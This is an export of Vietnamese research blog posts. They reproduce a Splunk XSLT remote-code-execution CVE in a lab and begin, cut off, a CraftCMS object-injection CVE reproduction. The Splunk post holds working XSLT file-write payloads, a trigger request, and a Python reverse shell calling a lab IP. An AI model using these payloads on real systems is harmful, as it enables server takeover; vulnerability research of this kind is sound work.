[{"content":" Lại một tháng nữa đã trôi qua… Tháng trước tôi nghiên cứu về CVE-2021-42237, một lỗ hổng liên quan đến .Net Deserialization cho phép kẻ tấn công thực thi code trên hệ thống sitecore mà không cần cơ chế xác thực nào. Cũng tính viết một blog về nó, nhưng sau khi làm xong tôi phát hiện ra mình chưa đủ kiến thức để viết. Bởi vì với deserialization thì hầu hết sẽ có 2 bước quan trong đó là tìm được sink (nơi deserialize) và chain. Với CVE trên, sink thì từ source tới sink khá đơn giản để nói lại mà còn chain thì quá phức tạp (với người mới như tôi). Bên cạnh đó, sau khi đi qua nhiều ngôn ngữ để trải nghiệm thì kế hoạch sắp tới của tôi sẽ tập trung chuyên sâu vào ngôn ngữ Java và DotNet. Nên tôi sẽ quay lại và làm blog chi tiết về nó sau. Cứ ngỡ tháng này sẽ như tháng trước, sẽ bị phạt tiếp 200k vì trong tháng tôi chỉ lo đi học, pentest blackbox mà không có reproduce, research gì cả thì đùng một phát, sếp gửi có cái CVE của splunk và bảo reproduce. Đúng là trời hạn gặp mưa rào, bắt tay ngay vào việc thôi.😋😋😋😋. I. Giới thiệu về CVE-2023-46214 CVE-2023-46214 là mã lỗi xuất hiện trên sản phẩm Splunk Enterprise cho phép attacker có thể thực thi lỗi ở server (RCE). Phiên bản bị lỗi từ 9.0.7--\u0026gt;9.1.2.\nLỗ hổng này do lỗi trong cách xử lý các biến đổi ngôn ngữ kiểu dáng mở rộng (XSLT) của Splunk Enterprise. Kẻ tấn công có thể khai thác lỗ hổng để tải lên tệp XSLT độc hại sẽ được Splunk Enterprise thực thi. Điều này có thể cho phép kẻ tấn công kiểm soát hệ thống bị ảnh hưởng. https://nvd.nist.gov/vuln/detail/CVE-2023-46214\nNhư những CVE trước đó, để reproduce 1days, Ndays chúng ta cần phải tìm hiểu các kiến thức nền tảng cần thiết, cài môi trường bị lỗi, tìm sink, source rồi build payload và cuối cùng là kiếm chứng.\nII. Kiến thức nền tảng Trước khi đi vào phân tích lỗ hổng, chúng ta cùng đi qua một số đơn vị kiến thức cơ bản và cần thiết cho lỗ hổng này:\n2.1 Splunk là gì? Cài đặt như thế nào? Splunk là một phần mềm chủ yếu được sử dụng để tìm kiếm, giám sát và kiểm tra dữ liệu do máy tạo ra thông qua giao diện web từ đó phân tích để đưa ra báo cáo cũng như cảnh báo với thời gian thực. Bạn có thể xem thêm thông tin tại đường dẫn sau: Splunk - Tổng hợp kiến thức cơ bản về Splunk dành cho người mới bắt đầu | Lab Network System Security (securityzone.vn) Có nhiều hướng dẫn trêm internet để cài đặt splunk, ví dụ như https://www.bitsioinc.com/install-splunk-linux/. Chúng ta chỉ cần làm theo là thực hiện được ngay. Với CVE này, môi trường thực nghiệm của tôi là: OS: ubuntu linux 22.04 splunk: 9.1.1 Tôi nhanh chóng tiến hành cài đặt phiên bản bị lỗi để thử nghiệm. 2.2 Extensible stylesheet language transformations (XSLT) là gì? Theo mô tả, lỗ hổng này do lỗi trong cách xử lý các biến đổi ngôn ngữ kiểu dáng mở rộng (XSLT) của Splunk Enterprise. Vậy XSLT là gì? Nói một cách đơn giản, nếu CSS là ngôn ngữ để định dạng cho HTML thì XSL (eXtensible Stylesheet Language) được dùng để định dạng cho XML XSLT viết tắt cho XSL Transformation. XSLT hỗ trợ chuyển đổi XML dưới dạng các document khác như TXT, PDF,SVG,… Với những ai lần đầu tiếp XSLT lần đầu như tôi thì w3school là nơi lý tưởng để lấy một ít kiến thức cơ bản. Bên cạnh đó, video và slide của Nicolas Gregoire - Agarri cũng là hai tài liệu quý giá khi mới tiếp cận về XSLT. III. Diff-patch để tìm sink Có nhiều cách để tìm sink trong đó, diff patch (cách nói ngắn gọn cho việc diff bản bị lỗi với bản vá để xem các đoạn code đã sửa) là phương pháp rất phổ biến đối với các mã nguồn mở hoặc các product có thể xem được mã nguồn. May mắn thay, với splunk, chúng ta có thể xem mã nguồn và từ đó diff patch một cách dễ dàng.\n2.1 Diff patch source như thế nào? Để xác định được sink (nơi bị lỗi), chúng ta cần mã nguồn của bản bị lỗi và bản đã vá, sau đó so sánh xem những đoạn code đã được sửa (diff). Chúng ta tải 2 phiên bản lỗi và đã fix Extract code từ .deb file bằng lệnh:\n1 ar x {file.deb} Lệnh ar có thể được cài bằng lệnh sau:\n1 sudo apt install binutils Khi decode xong chúng ta sẽ được nhiều file, hãy chú ý tới file data.tar.xz bởi vì file này chứa nhiều mã nguồn mà chúng ta cần tham khảo.\nĐể diff-patch 2 project lớn, tôi thường sử dụng Git. Chúng ta chỉ cần commit 2 version lên rồi dùng tính năng diff của git để xem. Với project nhỏ thì khá đơn giản, nhưng project lớn, việc này khá tốn thời gian. Chúng ta có thể sử dụng git extension của vscode, nhưng tại thời điểm sử dụng thì vscode của tôi lại không show ra được git commit. (chắc có lẽ bị lỗi gì đó)\nMột giải pháp thay thế đó là sử dụng gitk. Bạn có thể tìm hiểu thêm tại đây.\nGiao diện tiện lợi cho tôi trace.\n2.2. Sink ở đâu??? Chúng ta đã giải quyết được bài toán làm sao để diff-patch được mã nguồn của bản bị lỗi và bản đã vá, đồng thời, chúng ta cũng cài đặt thành công phiên bản bị lỗi của splunk. Bước tiếp theo là cần để xác định được sink ở đâu. Bởi vì, dữ kiện duy nhất mà tôi có được từ CVE này là liên quan tới XSLT trong khi đây cũng là lần đầu tôi biết tới sự tồn tại của nó (gà quá mà 😢 😢). Do đó, điều tôi cần làm bây giờ là tìm hiểu xem có những tài liệu, blog nào liên quan tới việc tấn công sử dụng XSLT hay không, từ đó rút ra các dấu hiệu của nó. Ngoài ra, tôi còn phải tìm hiểu xem XSLT trong splunk có vai trò như thế nào? (được sử dụng ở đâu, implement như thế nào? source code nằm ở đâu). CVE này liên quan tới việc truyền 1 dữ liệu XSLT lên server, do đó, chúng ta cần phải tìm hiểu xem những nơi nào nhận code XSLT có bị sửa đổi giữa 2 version, đặc biệt chú ý tới các tính năng upload cũng như các tham số nhận từ người dùng. Tôi dùng tính năng search của gitk để tìm từ khóa XSLT. Wow! Tôi đã thấy đoạn code sửa đáng nghi ngờ, nó nằm ở: source/data_extract/opt/splunk/lib/python3.7/site-packages/splunk/appserver/mrsparkle/controllers/search.py\nNhảy vào đọc thôi!\nChúng ta thấy, những dòng code được sửa có liên quan đến tính năng parse file. Cụ thể, phiên bản bị lỗi thì file ở xslFilePath được đọc và parse ngay trong khi ở phiên bản fix thì đường dẫn này được đưa vào hàm parse_xsl_file_and_validate trước khi xử lý.\nDựa vào tên hàm tôi có thể đoán được công dụng hàm này để sanitize nội dung XSLT có trong file trước khi parse. Khá giống với mô tả của lỗ hổng nên khả năng cao lỗ hổng là ở đây. Do đó, tôi quyết định tập trung vào hàm này. Mở code bị lỗi lên vào đọc hiểu, tìm bug thôi!!! Tôi nhanh chóng mở Vscode và vào đường dẫn $SPLUNK_HOME/lib/python3.7/site-packages/splunk/appserver/mrsparkle/controllers/search.py\nĐoạn code bị nghi ngờ lỗi như sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 ... elif moduleName and (\u0026#39;xsl\u0026#39; in kwargs) and output and enableSearchJobXslt: logger.debug(\u0026#39;search api got xsl request: %s\u0026#39; % moduleName) # get XSL file xslFilePath = os.path.abspath(bundle_paths.expandvars(os.path.join(self.moduleRoster[moduleName][\u0026#39;path\u0026#39;], kwargs[\u0026#39;xsl\u0026#39;]))) splunkHomePath = bundle_paths.expandvars(\u0026#39;$SPLUNK_HOME\u0026#39;) xsl_file_meta_data = JobsController.get_xsl_file_meta_data(xslFilePath) if not xsl_file_meta_data.get(\u0026#34;file_exists\u0026#34;): cherrypy.response.headers[\u0026#39;content-type\u0026#39;] = MIME_HTML logger.warn(\u0026#39;File xsl=\u0026#34;%s\u0026#34; is not available\u0026#39; % xslFilePath) output = \u0026#39;The file you are trying to access is not available\u0026#39; elif not xsl_file_meta_data.get(\u0026#34;is_valid_extension\u0026#34;): cherrypy.response.headers[\u0026#39;content-type\u0026#39;] = MIME_HTML logger.warn(\u0026#39;File xsl=\u0026#34;%s\u0026#34; is not available\u0026#39; % xslFilePath) output = \u0026#39;The file you are trying to access does not have a valid extension.\u0026#39; elif xslFilePath.startswith(splunkHomePath): try: f = open(xslFilePath, \u0026#39;r\u0026#39;) xslt_doc = et.parse(f) f.close() # generate transformer transform = et.XSLT(xslt_doc) # transform the XML xmlDoc = et.fromstring(output) transformedOutput = transform(xmlDoc) cherrypy.response.headers[\u0026#39;content-type\u0026#39;] = MIME_HTML html = et.tostring(transformedOutput) if not html: output = \u0026#39;Loading...\u0026#39; else: output = html ... Chúng ta thấy rằng, từ dòng 24-37 nội dung của file tại xslFilePath được đọc, parse, transform mà không hề có sự kiểm tra hay lọc sạch dữ liệu nào. Như đã đề cập, trước khi tiếp xúc tới đoạn code này thì tôi đã google tìm đọc các tài liệu liên quan các lỗ hổng khai thác có sử dụng XSLT. Chỉ với key word đơn giản: XSLT + exploit + RCEvào google bạn đã thấy có rất nhiều tài liệu liên quan\nTôi nhanh chóng chú ý đến Abusing XSLT for Practical Attacks White Paper được đề cập trong HackTricks. Và một số tài liệu rất quý báu cho tôi trong quá trình tái tạo lại lỗ hổng này:\nhttps://owasp.org/www-pdf-archive/OWASP_Switzerland_Meeting_2015-06-17_XSLT_SSRF_ENG.pdf https://www.youtube.com/watch?v=8YYa1CWI1AU https://prezi.com/y_fuybfudgnd/offensive-xslt/ Một tips để kiếm các nguồn tài liệu chất lượng là các bạn hãy kiếm 1-2 paper hoặc slide liên quan tới nội dung cần tìm kiếm ở các diễn đàn hoặc các trang web nổi tiếng (như blackhat, owasp,..) rồi xem thêm ở phần references.\nSau khi đã có một cái hiểu “sơ sơ” về lỗ hổng này và nhận thấy splunk xử dụng phần parser xslt bằng thư viện lxml của python. Và đoạn code này tôi hoàn toàn có thể tái tạo lại ở local mà không có bất cứ ràng buộc thư viện riêng nào của splunk, nên tôi đã tạo một đoạn code nhỏ, mô phỏng qua trình này trên local để thử nghiệm xem thử liệu đây có phải là sink mà chúng ta tìm kiếm.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 import sys import lxml.etree as et if len(sys.argv) != 2: print(\u0026#34;Usage: python3 splunk-xslt-handler.py \u0026lt;path_to_file_xsl\u0026gt;\u0026#34;) sys.exit(1) xslFilePath = sys.argv[1] try: with open(xslFilePath, \u0026#39;r\u0026#39;) as f: xslt_doc = et.parse(f) output = \u0026#39;\u0026lt;catalog\u0026gt;\u0026lt;/catalog\u0026gt;\u0026#39; # generate transformer transform = et.XSLT(xslt_doc) # transform the XML xmlDoc = et.fromstring(output) transformedOutput = transform(xmlDoc) print(et.tostring(transformedOutput, pretty_print=True).decode(\u0026#34;utf-8\u0026#34;) ) html = et.tostring(transformedOutput) if not html: output = \u0026#39;Loading...\u0026#39; else: output = html except FileNotFoundError: print(f\u0026#34;Error: File not found at path {xslFilePath}\u0026#34;) sys.exit(1) except Exception as e: print(f\u0026#34;An error occurred: {e}\u0026#34;) sys.exit(1) Tài liệu của owaps tôi đã đề cập trước đó có đưa ra các payload khai thác và kết thúc mỗi payload đều có bảng tổng kết cho thấy payload này có thể khai thác thành công trên từng loại XSLT Processors nào.\nỞ local, chúng ta cũng sẽ đi từng bước để build payload. Đầu tiên, chúng ta cần phải xác định python đang chạy sử dụng loại processor nào.\nĐể thu thập thông tin hệ thống, ta tạo file disclosure.xsl\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;xsl:stylesheet version=\u0026#34;1.0\u0026#34; xmlns:xsl=\u0026#34;http://www.w3.org/1999/XSL/Transform\u0026#34;\u0026gt; \u0026lt;xsl:template match=\u0026#34;/\u0026#34;\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; XSLT version: \u0026lt;xsl:value-of select=\u0026#34;system-property(\u0026#39;xsl:version\u0026#39;)\u0026#34;/\u0026gt;\u0026lt;br/\u0026gt; XSL vendor: \u0026lt;xsl:value-of select=\u0026#34;system-property(\u0026#39;xsl:vendor\u0026#39;)\u0026#34;/\u0026gt;\u0026lt;br/\u0026gt; XSL vendor URL: \u0026lt;xsl:value-of select=\u0026#34;system-property(\u0026#39;xsl:vendor-url\u0026#39;)\u0026#34;/\u0026gt;\u0026lt;br/\u0026gt; Version: \u0026lt;xsl:value-of select=\u0026#34;system-property(\u0026#39;xsl:version\u0026#39;)\u0026#34; /\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;/xsl:template\u0026gt; \u0026lt;/xsl:stylesheet\u0026gt; kết quả chương trình\nNhư vậy, processor (hay vendor) hỗ trợ ở đây là libxslt\nLướt 1 vòng các mã khai thác trong tài liệu của owaps ở trên, thì tôi thấy có một mã khai thác cho phép tạo file. Tuy nhiên, bạn copy nguyên đoạn code trong tài liệu sẽ chạy không được, mà cần google thêm 1 tí để thêm thành phần còn thiếu. Tôi tạo được file create-file.xsl với nội dung như sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;xsl:stylesheet xmlns:xsl=\u0026#34;http://www.w3.org/1999/XSL/Transform\u0026#34; xmlns:exsl=\u0026#34;http://exslt.org/common\u0026#34; extension-element-prefixes=\u0026#34;exsl\u0026#34; exclude-result-prefixes=\u0026#34;exsl\u0026#34; version=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;xsl:template match=\u0026#34;/\u0026#34;\u0026gt; \u0026lt;exsl:document href=\u0026#34;local_edisc_file.txt\u0026#34;\u0026gt; \u0026lt;xsl:text\u0026gt;Write Write Files\u0026lt;/xsl:text\u0026gt; \u0026lt;/exsl:document\u0026gt; \u0026lt;/xsl:template\u0026gt; \u0026lt;/xsl:stylesheet\u0026gt; Test thử ở local\nYeah, vậy là chúng ta đã thành công tạo ở local. Đến đây chúng ta đã khẳng định được đây chính là sink mà chúng ta tìm, đồng thời chúng ta cũng xây dựng được payload tạo file. Bước tiếp theo cần phải từ sink tìm source.\nIV. Từ sink tìm source rồi RCE Để tìm source, chúng ta cần tìm hiểu route của ứng dụng để xem thử các request truyền vào sẽ được route đi đâu.\nQuay lại với đoạn code bị lỗi. Đoạn code này nằm trong hàm def getJobAsset(self, sid, asset, compat_mode=True, **kwargs): với route như sau:\nVà hàm getJobAsset thuộc class class JobsController(BaseController): với route như sau:\nNhư vậy, để truy cập tới getJobAsset thì path sẽ là /search/jobs/:sid/:asset?param1=a\u0026amp;param2=b\u0026amp;...\u0026amp;paramN=n Các biến param sẽ lưu trong **kwargs của hàm getJobAsset Ngoài ra, dòng lệnh @expose_page(handle_api=ONLY_API) tại định nghĩa của hàm getJobAsset cho thấy request chúng ta chỉ được truy cập dưới dạng api/... Do đó, để truy cập tới endpoint thì ta sẽ có request dạng\n/api/search/jobs/:sid/:asset?param1=a\u0026amp;param2=b\u0026amp;...\u0026amp;paramN=n\nĐiều cần làm đầu tiên là phải có sid.\n4.1 Tìm sid Tôi bắt đầu dạo quanh các tính năng của splunk. Đây là kĩ năng thường được sử dụng khi tôi tiến hành blackbox. Kết hợp với type bug này thuộc dạng upload file, nên trong quá trình “đi dạo” tôi cũng chú ý tới các tính năng upload file. Với tiêu chí đó, tôi tin rằng bất kì bạn nào cũng sẽ như tôi, dễ dàng chú ý với tính năng này Tính năng này cho phép upload file từ máy và sẽ tạo cho chúng ta một mã sid Tôi upload thử payload mà chúng ta đã build ở local sid là giá trị nằm ở trường text 4.2 Build payload tạo file bất kì. Bây giờ đã có sid rồi, tiến hành kiểm tra xem thử suy đoán về endpoint của chúng ta có đúng không. Quay lại đọc hiểu đoạn code và thêm các điều kiện tương ứng để touch được tới hàm.Ngoài ra splunk cũng có document hỗ trợ các api của họ, đó cũng là nguồn tài liệu quý giá cho chúng ta tìm hiểu. Phương pháp tiếp cận để build payload mà tôi sử dụng là đi từ trong ra ngoài, tức là từ vị trí hàm bị lỗi trace ngược lại source để tìm các điều kiện hợp lệ. Quay lại với hàm sink: Dòng code 476-488 là đoạn code trigger lỗi, để vào được đường này thì đĩa chỉ xslFilePath phải bắt đầu với splunkHomePath tức là /opt/splunk trên linux. Hãy thử kiểm tra file vừa upload trên server có thỏa mãn điều kiện này không bằng lệnh\n1 find / -name create-file.xsl Dễ thấy điều kiện này đã được thỏa mãn vì file nằm ở đường dẫn: /opt/splunk/var/run/splunk/dispatch/1700794908.13/create-file.xsl\nOkie, tiếp tục trace ngược thôi\nTiếp tục để đi vào đoạn code bị lỗi thì điều kiện if tại dòng 454 phải trả về true, tức là phải thỏa mãn các kiều kiện sau:\nmodulename khác rỗng ouput khác rỗng có tham số xml trong request tính năng enableSearchJobXslt được bật Trong các điều kiện trên thì tính năng enableSearchJobXslt được bật trong /opt/splunk/etc/system/default/web.conf\nPhần còn lại là cần một param xsl trong request và biến moduleName cùng biến output phải khác rỗng.\nXác định module name Hãy xem xét đoạn code sau đây\nChúng ta thấy self.moduleRoster là một danh sách chứa các module name có giá trị từ getInstalledModules().\nVào hàm getInstalledModules chúng ta sẽ thấy danh sách các module được load từ địa chỉ share/splunk/search_mrsparkle/modules\nNhư vậy, để có module name, bạn chỉ cần vào địa chỉ trên và lấy 1 module name hợp lệ bất kì\nXác định giá trị tham số xsl Dễ thấy xsl là địa chỉ file xsl đã được upload lên\nXác định giá trị của tham số output Giá trị output thì sẽ phụ thuộc vào giá trị :asset ở endpoint.\nMuốn hiểu rõ thì chỉ cần vào đọc hàm cụ thể thôi (Tôi sẽ không đi chi tiết ở bước này) Một gợi ý nhỏ ở đây nhé\nKết hợp tất cả lại, tôi có request trigger như sau\n1 2 3 4 5 6 7 8 9 10 11 GET /en-US/api/search/jobs/1700807110.5/results?xsl=/opt/splunk/var/run/splunk/dispatch/1700807110.5/create-file.xsl HTTP/1.1 Host: 192.168.211.142:8000 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0 X-Splunk-Module: Splunk.Module.Message Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://192.168.211.142:8000/api/search/jobs/1700794908.13/result?xml=/opt/splunk/var/run/splunk/dispatch/1700794908.13/create-file.xsl\u0026amp;moduleName=xxx Connection: close Cookie: splunkweb_csrf_token_8000=15864032431698820033; token_key=15864032431698820033; experience_id=60628533-bacb-80d8-031c-394ae7d02d4d; session_id_8000=695d1121b3eafb28941fbee55bb0ffa199361729; splunkd_8000=8YZgg26WnjVeb_vE9B5ivk2ey1_LCEOtL^6ROXioKJbLF8eCGGod_z2TW^E0M0kpdZ0YiRFWgQ4gVvg667RisM2uusYst1OrT2HoLj^uOxeICOPBR4ModuolspV7GAn_y^x Upgrade-Insecure-Requests: 1 Request có output là loading…\nNhư vậy trigger thành công, kiểm tra xem thành quả nào\nYeah, trên server của chúng ta đã có file. Nhưng tại sao nó lại nằm ở root nhỉ?\nSau khi thử lại trên local, tôi nhận thấy với payload tạo file\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;xsl:stylesheet xmlns:xsl=\u0026#34;http://www.w3.org/1999/XSL/Transform\u0026#34; xmlns:exsl=\u0026#34;http://exslt.org/common\u0026#34; extension-element-prefixes=\u0026#34;exsl\u0026#34; exclude-result-prefixes=\u0026#34;exsl\u0026#34; version=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;xsl:template match=\u0026#34;/\u0026#34;\u0026gt; \u0026lt;exsl:document href=\u0026#34;/home/edisc/local_edisc_file.txt\u0026#34;\u0026gt; \u0026lt;xsl:text\u0026gt;Write Write Files\u0026lt;/xsl:text\u0026gt; \u0026lt;/exsl:document\u0026gt; \u0026lt;/xsl:template\u0026gt; \u0026lt;/xsl:stylesheet\u0026gt; tôi có thể trỏ địa chỉ viết file tại href đến bất cứ đâu. Và vì splunk trên local đang được deploy với quyền root nên hầu như tôi có thể viết file đến bất kì vị trí nào trên server.\nTiếp theo, chúng ta cần phải tìm xem nên viết ở đâu để có thể trigger được RCE\n4.3 RCE Chúng ta đã có thể ghi một file bất kì vào vị trí bất kì, bước tiếp theo là cần phải tìm cách để thực thi code trên server.\nHãy bắt đầu với một vài keyword trên google nào: splunk + execute code; splunk + run code\n4.3.1 RCE với scripts Dễ dàng chúng ta sẽ tìm đến được keyword: scripts. Cơ bản là scripts là một câu lệnh cho phép người dùng thực thi các đoạn code python đã được định nghĩa trước trên server để tối ưu quá trình thực thi. Chi tiết bạn có thể xem ở đây\nĐể nhanh chóng, bạn có thể xem video này\nĐơn giản là chúng ta chỉ cần viết một file python vào đường dẫn $SPLUNK_HOME\\bin\\scripts hoặc $SPLUNK_HOME\\etc\\apps\\search\\bin rồi load script của chúng ta lên, thế là chạy.\nCụ thể, tôi chạy tạo file .xsl với nội dung sau:\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;xsl:stylesheet xmlns:xsl=\u0026#34;http://www.w3.org/1999/XSL/Transform\u0026#34; xmlns:exsl=\u0026#34;http://exslt.org/common\u0026#34; extension-element-prefixes=\u0026#34;exsl\u0026#34;\u0026gt; \u0026lt;xsl:template match=\u0026#34;/\u0026#34;\u0026gt; \u0026lt;exsl:document href=\u0026#34;/opt/splunk/etc/apps/search/bin/getshell_edisc.py\u0026#34; omit-xml-declaration=\u0026#34;yes\u0026#34;\u0026gt; \u0026lt;xsl:text\u0026gt;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;192.168.18.1\u0026#34;,8822));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\u0026#34;sh\u0026#34;)\u0026lt;/xsl:text\u0026gt; \u0026lt;/exsl:document\u0026gt; \u0026lt;/xsl:template\u0026gt; \u0026lt;/xsl:stylesheet\u0026gt; Khi thực hiện lại ở bước 4.2 thì chúng ta sẽ tạo được file getshell_edisc.py tại /opt/splunk/etc/apps/search/bin/getshell_edisc.py Bước tiếp theo thì chỉ cần làm như video, load script của chúng ta lên thôi. Video POC nè\n4.3.2 RCE với runshellscript Khi đọc tài liệu của scripts trên splunk, tôi chú ý đến một chú ý về security Vào đường dẫn SPL safeguards for risky commands, chúng ta sẽ thấy một list các command được đánh giá là rủi ro nếu sử dụng không đúng Trong danh sách này có hàm runshellscript. Hàm này cho phép người dùng thực thi script để alert. Với command này, thao tác trigger script sẽ đơn giản hơn ở cách trước:\nViết shell tại đường dẫn /opt/splunk/bin/scripts/ Nhập đúng format câu lệnh vào ô search là để trigger V. Nguồn tham khảo https://www.w3schools.com/xml/xsl_intro.asp\nhttps://www.youtube.com/watch?v=8YYa1CWI1AU\nhttps://prezi.com/y_fuybfudgnd/offensive-xslt/\nhttps://www.blackhat.com/docs/us-15/materials/us-15-Arnaboldi-Abusing-XSLT-For-Practical-Attacks-wp.pdf\nhttps://owasp.org/www-pdf-archive/OWASP_Switzerland_Meeting_2015-06-17_XSLT_SSRF_ENG.pdf\n","description":"CVE-2023-46214 là mã lỗi xuất hiện trên sản phẩm Splunk Enterprise cho phép attacker có thể thực thi lỗi ở server (RCE). Phiên bản bị lỗi từ `9.0.7--\u003e9.1.2`. Lỗ hổng này do lỗi trong cách xử lý các biến đổi ngôn ngữ kiểu dáng mở rộng (XSLT) của Splunk Enterprise. Kẻ tấn công có thể khai thác lỗ hổng để tải lên tệp XSLT độc hại sẽ được Splunk Enterprise thực thi. Điều này có thể cho phép kẻ tấn công kiểm soát hệ thống bị ảnh hưởng.","id":0,"section":"posts","tags":["cve, python"],"title":"Reproducing CVE-2023-46214: Splunk RCE","uri":"https://minhlongmt183.github.io/posts/cve_2023_46214_splunk_rce/"},{"content":"I. Lời mở đầu Sau vài tháng đắm chìm vào Java Deserialize attack, tôi tí nữa là bị chết chìm luôn 😟. Đợt này nhân tiện có CVE mới về CraftCMS và đọc được bài blog về nó trên https://blog.calif.io/p/craftcms-rce, tôi quyết định reproduce để ôn lại PHP và lấy lại mood. CraftCMS là một hệ thống quản lý nội dung (CMS) mã nguồn mở dựa trên PHP. Nó được thiết kế để tạo các trang web và ứng dụng web mạnh mẽ và linh hoạt. CVE-2023-41892 là lỗ hổng trên CraftCMS, cho phép attacker RCE mà không cần authen. Lỗ hổng đã được fix ở version 4.4.15 II. Setup môi trường CraftCMS Đối với các product viết bằng PHP, một trong những khó khăn lớn nhất hay gặp phải là setup môi trường. Với Craftcms, ta thực hiện các bước như sau: Tôi cài đặt trên môi trường ubuntu 22.04, và cái đặt XAMPP với phiên bản php 8.1.17\nSau đó cài composer: https://getcomposer.org/Composer-Setup.exe (lưu ý cần cài đặt xampp trước)\nDownload phiên bản craftcms bị lỗi, ở đây, tôi chọn bản 4.4.12 (https://github.com/craftcms/cms/releases/tag/4.4.12)\nExtract file và bỏ vào folder /opt/lampp/htdocs/my-craftcms\nChạy lệnh composer install Nếu bị lỗi về thiếu extension thì vào php.ini của xampp để bật lên (có thể xóa đi file composer.lock)\nChạy lệnh sau để tạo secret key\n1 php craft setup/security-key Để đảm bảo câu lệnh chạy xong, bạn có thể xem trong file .env\nVào địa chỉ http://localhost/my-craftcms/web/admin/install Tại đây, tiến hành cài đặt như các hướng dẫn khác trên internet\nNOTE\nTrên Linux, nếu vào địa chỉ trên bị lỗi, có thể dùng câu lệnh để fix\n1 sudo chmod -R 777 .env composer.* config storage vendor web/cpresources Tại bước này thì trên internet có rất nhiều, bạn chỉ cần chọn 1 cái và làm theo là được\nNhư thế này là thành công rồi\nNgoài ra, các bạn có thể tìm hiểu và setup cách để debug php code theo link sau: https://www.cloudways.com/blog/php-debug/ (thêm vào php.ini)\nTrên Windows\n1 2 3 4 [XDebug] zend_extension = \u0026#34;c:\\xampp\\php\\ext\\php_xdebug.dll\u0026#34; xdebug.mode = debug xdebug.start_with_request = yes Trên Linux (/opt/lampp/etc/php.ini)\n1 2 3 zend_extension = xdebug xdebug.mode = debug xdebug.start_with_request = yes III. Lỗ hổng CVE-2023-41892 Như đã đề cập trước đó, đây là loại bug có liên quan đến PHP object injection, cho phép thực thi code (RCE) (https://github.com/craftcms/cms/security/advisories/GHSA-4w8r-3xrw-v25g) 3.1 Diff-patch tìm root-cause Trước tiên, hãy diff-patch thử, trên github cũng có (https://github.com/craftcms/cms/commit/c0a37e15cc925c473e60e27fe64054993b867ac1##diff-47dd43d86f85161944dfcce2e41d31955c4184672d9bd9d82b948c6b01b86476)\nDễ thấy, trong class src/controllers/ConditionsController.php của craftcms/cms, các đoạn code được thêm vô\n1 2 3 4 5 if (!parent::beforeAction($action)) { return false; } $this-\u0026gt;requireCpRequest(); và hàm return parent::beforeAction($action); tại dòng 51 bị bỏ đi. Điều này cho thấy lỗ hổng này có liên quan tới thứ tự thực thi của câu lệnh parent::beforeAction($action);.\nVới 1 newbie như tôi thì câu hỏi hiện lên đầu tiên: Controller:beforeAction là gì? Cơ chế hoạt động như thế nào? (Tôi là 1 newbie nên những câu hỏi bị xem ngớ ngẩn và cơ bản là chuyện bình thường, điều chúng ta chỉ cần làm đó là ghi nhận và giải đáp)\nGoogle một tí, ta sẽ tìm được câu trả lời tại https://hotexamples.com/examples/-/Controller/beforeAction/php-controller-beforeaction-method-examples.html\nĐây là một pre-action hook (tôi không biết dịch thế nào, đại khái trước khi PHP controller thực thi, hàm này sẽ được thực thi trước). Thông thường, hàm này dùng để check authen hoặc một số tiền điều kiện nào đó trước khi thực thi hàm controller. Đây là một action tự động của framework. Đồng thời, từ blog ta cũng sẽ biết thêm 1 framework mà craft sử dụng: [Yii](https://viblo.asia/p/yii-framework-tim-hieu-cau-truc-va-chay-thu-voi-basic-application-Qbq5QJOJKD8)\nNhư đã trình bày ở trên, hàm beforeAction() thường liên quan tới authen hoặc các tiền điều kiện nào đó, kết hợp với tiêu đề của lỗ hổng, ta có thể đoán ra chính thứ tự này dẫn tới unauthenticated bug. (không cần xác thực.)\nOkie, đã thấy được nơi để bắt đầu rồi ta cùng tìm hiểu flow của đoạn code này để tìm sink và từ sink trace ngược lại source.\n3.2 Từ source đến sink Hãy nhìn vào phần comment của class ConditionsController.php\nTheo mô tả, class này xử lý các tác vụ liên quan tới các điều kiện để render, thêm xóa các rules. Sau vài tiếng debug và xem xét, cuối cùng tôi cũng tìm được endpoint để touch tới được sink này:\n1 2 3 4 5 6 7 8 9 10 11 12 13 POST /my-craftcms/web/admin/conditions HTTP/1.1 Host: 192.168.159.148 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://192.168.159.148/my-craftcms/web/admin/plugin-store/feed-me Content-Type: application/x-www-form-urlencoded Content-Length: 26 Origin: http://192.168.159.148 DNT: 1 action=conditions%2Frender Tiếp theo, chúng ta debug, tìm hiểu để điền các thông tin mình muốn và xem flow đi tiếp theo như thế nào, cuối cùng tôi được request như sau:\n1 2 